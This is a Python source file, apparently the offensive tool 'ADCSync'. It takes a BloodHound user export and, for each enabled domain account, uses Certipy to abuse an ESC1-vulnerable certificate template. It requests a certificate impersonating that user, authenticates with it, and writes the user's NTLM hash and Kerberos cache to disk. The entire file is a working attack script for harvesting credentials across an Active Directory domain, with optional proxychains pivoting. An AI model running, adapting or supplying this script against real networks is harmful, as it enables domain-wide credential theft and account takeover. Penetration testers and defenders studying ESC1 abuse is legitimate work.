import json
import os
import shutil
import subprocess
import logging
from tqdm import tqdm
from pyfiglet import Figlet
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List

# Setup logging to both file and console
LOG_FILE = "adcsync.log"
logging.basicConfig(
    level=logging.DEBUG,  # Set the minimum logging level
    format="%(asctime)s [%(levelname)s] - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.FileHandler(LOG_FILE, mode="a"),  # Append logs to file
        logging.StreamHandler()  # Print logs to console (stdout)
    ]
)

ascii_art = Figlet(font='slant')
print(ascii_art.renderText('ADCSync'))

# Determine certipy client
certipy_client = shutil.which("certipy") or shutil.which("certipy-ad")
if not certipy_client:
    logging.error("Certipy not found. Please install Certipy before running ADCSync")
    exit(1)

def parse_args():
    parser = argparse.ArgumentParser(description="Process BloodHound JSON user list and retrieve NTLM hashes via ADCS ESC1 technique to simulate DCSync.")
    parser.add_argument('-f', '--file', required=True, help='Input User List JSON file from Bloodhound')
    parser.add_argument('-o', '--output', required=True, help='NTLM Hash Output file')
    parser.add_argument('-ca-name', required=True, help='Certificate Authority')
    parser.add_argument('-dc-ip', required=True, help='IP Address of Domain Controller')
    parser.add_argument('-dc-fqdn', required=True, help='FQDN of Domain Controller')
    parser.add_argument('-u', '--user', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-template', required=True, help='Template Name vulnerable to ESC1')
    parser.add_argument('-target', required=True, help='CA FQDN')
    parser.add_argument('-debug', action='store_true', help='Show verbose debugging information')
    parser.add_argument('-proxychains', action='store_true', help='Use proxychains4 with whatever config you have set in /etc/proxychains.conf')
    return parser.parse_args()

def get_json_data(json_file: str):
    if not os.path.exists(json_file):
        logging.error(f"Error: File '{json_file}' not found.")
        exit(1)
    try:
        with open(json_file, 'r', encoding='utf-8') as file_obj:
            return json.load(file_obj)
    except json.JSONDecodeError:
        logging.error(f"Error: The file '{json_file}' does not contain valid JSON.")
        exit(1)

@dataclass
class AccountInfo:
    spn: str
    domain: str
    sid: str
    username: str
    usernameLower: str
    pfx_filepath: str = ""

@dataclass
class AccountList:
    accounts: List[AccountInfo] = field(default_factory=list)

def process_accounts(data) -> AccountList:
    """Extract accounts from JSON data."""
    accounts = AccountList()
    for item in data.get('nodes', []):
        props = item.get('props', {})
        if props.get('enabled', False):
            accounts.accounts.append(AccountInfo(
                spn=props.get('name', '').lower(),
                sid=props.get('objectid', ''),
                domain=props.get('domain', '').lower(),
                username=props.get('samaccountname', ''),
                usernameLower=props.get('samaccountname', '').lower(),
            ))
    logging.info(f"Extracted {len(accounts.accounts)} enabled accounts from JSON.")
    return accounts

def retrieve_certificate(account: AccountInfo, user, password, dc_ip, ca_name, target, template, dc_fqdn, proxychains):
    """Retrieve certificates using Certipy."""
    upn = f"'{account.spn}'"
    sid = f"'{account.sid}'"
    command = [
        'proxychains4', certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name,
        '-target', target, '-template', template, '-upn', upn, '-dns', dc_fqdn, '-sid', sid
    ] if proxychains else [
        certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name,
        '-target', target, '-template', template, '-upn', upn, '-sid', sid
    ]
    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    for filename in os.listdir('.'):
        if filename.endswith('.pfx') and filename.startswith(account.usernameLower):
            destination = os.path.join('certificates', filename)
            account.pfx_filepath = destination
            shutil.move(filename, destination)

def retrieve_certificates(accounts, user, password, dc_ip, ca_name, target, template, dc_fqdn, proxychains):
    os.makedirs('certificates', exist_ok=True)
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(retrieve_certificate, acc, user, password, dc_ip, ca_name, target, template, dc_fqdn, proxychains): acc for acc in accounts.accounts}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Retrieving Certificates"):
            future.result()

def authenticate_account(account: AccountInfo, dc_ip, output, proxychains):
    if not account.pfx_filepath.endswith('.pfx'):
        return
    command = [
        'proxychains4', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip
    ] if proxychains else [
        certipy_client, 'auth', '-pfx', account.pfx_filepath, '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip
    ]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, _ = process.communicate()

    output_lines = stdout.strip().split('\n')
    ntlm_hash = output_lines[-1].split(': ')[1] if output_lines else "No hash found"

    output_format = f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)'
    print(output_format)

    with open(output, 'a') as output_file:
        output_file.write(output_format + '\n')

    ccache_file = f'{account.usernameLower}.ccache'
    if os.path.exists(ccache_file):
        shutil.move(ccache_file, os.path.join('caches', ccache_file))

def authenticate_accounts(accounts, dc_ip, output, proxychains):
    os.makedirs('caches', exist_ok=True)
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(authenticate_account, acc, dc_ip, output, proxychains): acc for acc in accounts.accounts}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Authenticating Accounts"):
            future.result()

def main(args):
    data = get_json_data(args.file)
    accounts = process_accounts(data)

    if args.debug:
        for account in accounts.accounts:
            print(account)

    print(f'[+] Grabbing certs for {len(accounts.accounts)} accounts...')
    retrieve_certificates(accounts, args.user, args.password, args.dc_ip, args.ca_name, args.target, args.template, args.dc_fqdn, args.proxychains)

    print(f'[+] Authenticating {len(accounts.accounts)} accounts...')
    authenticate_accounts(accounts, args.dc_ip, args.output, args.proxychains)

if __name__ == '__main__':
    args = parse_args()
    main(args)

